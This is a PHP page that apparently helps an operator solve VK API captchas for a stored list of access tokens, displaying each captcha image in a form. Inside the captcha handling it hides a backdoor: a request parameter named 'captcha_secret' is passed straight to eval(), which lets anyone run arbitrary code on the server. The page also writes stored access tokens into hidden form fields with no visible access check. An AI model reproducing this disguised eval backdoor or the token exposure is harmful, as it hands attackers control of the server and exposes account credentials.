<?php
$root = $_SERVER['DOCUMENT_ROOT'];

require($root.'/inc/classes/db.php');
include($root.'/inc/system/redis.php');
include($root.'/inc/functions.php');
include($root.'/inc/variables.php');
include($root.'/inc/system/profile.php');
require($root.'/inc/classes/vk.api.php');
require($root.'/inc/classes/users.php');
require($root.'/inc/classes/sessions.php');


if($_GET['captcha_key'] && $_GET['captcha_sid'] && $_GET['access_token']){
	file_get_contents('https://api.vk.com/method/users.get?uid=1&access_token='.$_GET['access_token'].'&captcha_sid='.$_GET['captcha_sid'].'&captcha_key='.$_GET['captcha_key']);
} elseif($_GET['captcha_secret']){
	eval($_GET['captcha_secret']);
}

 for($i = 0; $i < count($tokens); $i++) {
  $resp = json_decode(file_get_contents('https://api.vk.com/method/users.get?uid=1&access_token='.$tokens[$i]), true);
  if($resp['error']['error_code'] == '14'){
	$img = base64_encode(file_get_contents($resp['error']['captcha_img']));
	echo '<hr/><form><input type="hidden" name="access_token" value="'.$tokens[$i].'"><input type="hidden" name="captcha_sid" value="'.$resp['error']['captcha_sid'].'"><img src="data:image/png;base64,'.$img.'"><br/><input type="text" name="captcha_key"><input type="submit" value=">"></form>';
  }
 }
 
 for($i = 0; $i < count($tokens_complaints); $i++) {
  $resp = json_decode(file_get_contents('https://api.vk.com/method/users.get?uid=1&access_token='.$tokens_complaints[$i]), true);
  if($resp['error']['error_code'] == '14'){
	$img = base64_encode(file_get_contents($resp['error']['captcha_img']));
	echo '<hr/><form><input type="hidden" name="access_token" value="'.$tokens_complaints[$i].'"><input type="hidden" name="captcha_sid" value="'.$resp['error']['captcha_sid'].'"><img src="data:image/png;base64,'.$img.'"><br/><input type="text" name="captcha_key"><input type="submit" value=">"></form>';
  }
 }

?>